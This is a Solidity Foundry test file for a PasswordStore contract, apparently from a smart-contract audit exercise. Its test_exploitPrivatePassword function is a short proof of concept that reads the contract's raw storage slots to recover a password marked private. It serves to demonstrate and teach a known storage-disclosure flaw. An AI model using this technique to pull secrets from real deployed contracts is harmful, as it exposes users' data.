// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test} from "forge-std/Test.sol";
import {PasswordStore} from "../src/PasswordStore.sol";
import {console} from "forge-std/console.sol";
contract TestPasswordStore is Test {
    PasswordStore passwordStore;

    address public OWNER = makeAddr("OWNER");

    function setUp() public {
        vm.startPrank(OWNER);
        passwordStore = new PasswordStore();
        vm.stopPrank();
    }

    function test_setPassword() public {
        vm.startPrank(OWNER);
        passwordStore.setPassword("myPassword");
        assertEq(passwordStore.getPassword(), "myPassword");
        vm.stopPrank();
    }

    function test_exploitPrivatePassword() public {
        vm.startPrank(OWNER);
        passwordStore.setPassword("myPassword");
        vm.stopPrank();

        bytes32 slot = bytes32(uint256(0)); // owner is stored in slot 0
        bytes32 value = vm.load(address(passwordStore), slot);
        console.logBytes32(value);
        assertEq(value, bytes32(uint256(uint160(OWNER))));

        slot = bytes32(uint256(1)); // password is stored in slot 1
        value = vm.load(address(passwordStore), slot);
        string memory password = string(abi.encodePacked(value));
        console.log("Password:", password);
    }
}
